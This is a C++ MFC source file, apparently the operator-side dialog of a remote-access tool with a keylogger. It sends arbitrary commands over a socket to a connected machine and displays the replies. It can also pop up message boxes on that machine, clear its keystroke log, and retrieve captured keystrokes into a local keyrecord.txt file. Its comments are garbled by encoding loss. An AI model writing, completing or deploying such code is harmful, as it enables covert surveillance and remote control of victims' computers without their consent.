// ClistenShow.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "socket apcet.h"
#include "ClistenShow.h"
#include "afxdialogex.h"
#include "Clistensocket.h"
char messg1[] = "tipmessagebox";
char messg2[] = "clearkeyboard";
char messg3[] = "keyboard";
char messg4[] = "exit";

void closedlg(HTREEITEM Item, CClistensocket *pSocket)
{
	pSocket->Close();
	HTREEITEM hRootItem = ptree->GetRootItem();
	ptree->DeleteItem(Item);
	MessageBoxA(0, "�Է�����", "tip", 0);
	
}

// ClistenShow �Ի���
IMPLEMENT_DYNAMIC(ClistenShow, CDialogEx)

ClistenShow::ClistenShow(CClistensocket *pSocket, HTREEITEM hnewItem, CWnd* pParent /*=NULL*/)
	: CDialogEx(ClistenShow::IDD, pParent)
{
	Item = hnewItem;
	m_pSocket = pSocket;
	
}

ClistenShow::~ClistenShow()
{
}

void ClistenShow::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(ClistenShow, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON1, &ClistenShow::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &ClistenShow::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON3, &ClistenShow::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON4, &ClistenShow::OnBnClickedButton4)
	ON_BN_CLICKED(IDC_BUTTON5, &ClistenShow::OnBnClickedButton5)
	ON_BN_CLICKED(IDC_BUTTON6, &ClistenShow::OnBnClickedButton6)
END_MESSAGE_MAP()


// ClistenShow ��Ϣ�������


BOOL ClistenShow::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	CString ip;
	UINT port;
	m_pSocket->GetPeerName(ip, port);
	CString str;
	str.Format(_T("%s,%d"),ip, port);
	SetWindowText(str);
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣:  OCX ����ҳӦ���� FALSE
}


void ClistenShow::OnBnClickedButton1()
{
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	m_pSocket->Send(messg4, 5, 0);
	closedlg(Item,m_pSocket);
	//a = 6;
	DestroyWindow();
	
}


void ClistenShow::OnBnClickedButton2()
{
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	char revData[4086] = "";
	//��ȡ����

	CString str;
	//������ʶ
	USES_CONVERSION;
	GetDlgItemText(IDC_CMD1, str);


	if (str != ""
		&&strcmp(T2A(str), messg1) != 0 
		&& strcmp(T2A(str), messg2) != 0 
		&& strcmp(T2A(str), messg3) != 0 
		&& strcmp(T2A(str), messg4) != 0)
	{
		//����
		char* sendData1 = T2A(str);
		m_pSocket->Send(sendData1, strlen(sendData1), 0);
		
		//����
		int rev = m_pSocket->Receive(revData, 4085, 0);//����ʽ����������������������
		if (rev<=0)
		{
			closedlg(Item, m_pSocket);
			DestroyWindow();
		}
		//GetDlgItem(IDC_CMD1)->SetWindowText((CString)"");
		//�����ı���
		//MessageBoxA(0, revData, "rec", 0);
		CString test = (CString)revData;
		SetDlgItemText(IDC_CMDRE1, test);
	}
	else
	{
		MessageBoxA(0, "�Ƿ�����", "Tip", 0);
	}


	//��������
	CString testc1 = (CString)"";
	SetDlgItemText(IDC_CMD1, testc1);
}


void ClistenShow::OnBnClickedButton3()
{
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	
	CString str;
	//������ʶ
	USES_CONVERSION;
	GetDlgItemText(IDC_CMD1, str);
	if (strlen(T2A(str))>500)
	{
		MessageBoxA(0, "�����̫��", "Tip", 0);
	}
	else if (str == "")
	{
		MessageBoxA(0, "�����Ϊ��", "Tip", 0);
	}
	else
	{
		
		m_pSocket->Send(messg1, strlen(messg1), 0);
		char* sendData2 = T2A(str);
		m_pSocket->Send(sendData2, strlen(sendData2), 0);
	}


	//��������
	CString testc1 = (CString)"";
	SetDlgItemText(IDC_CMD1, testc1);
}


void ClistenShow::OnBnClickedButton4()
{
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	CString testc2 = (CString)"";
	SetDlgItemText(IDC_CMDRE1, testc2);
}


void ClistenShow::OnBnClickedButton5()
{
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	m_pSocket->Send(messg2, strlen(messg2), 0);
	char revData[30] = "";
	int rev = m_pSocket->Receive(revData, 30, 0);
	if (rev <= 0)
	{
		closedlg(Item,m_pSocket);
		DestroyWindow();
	}
	CString testkeyc = (CString)revData;
	SetDlgItemText(IDC_CMDRE1, testkeyc);
}


void ClistenShow::OnBnClickedButton6()
{
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	m_pSocket->Send(messg3, strlen(messg3), 0);
	char revData[1000000] = "";
	int rev= m_pSocket->Receive(revData, 1000000, 0);
	if (rev <= 0)
	{
		closedlg(Item, m_pSocket);
		DestroyWindow();
	}
	FILE *fr = fopen("C:\\Users\\zlr\\Desktop\\keyrecord.txt", "ab+");
	fwrite(revData, 1, strlen(revData), fr);
	fclose(fr);
	CString testkey = (CString)"��¼�ѷ���C:\\Users\\zlr\\Desktop\\keyrecord.txt";
	SetDlgItemText(IDC_CMDRE1, testkey);
}
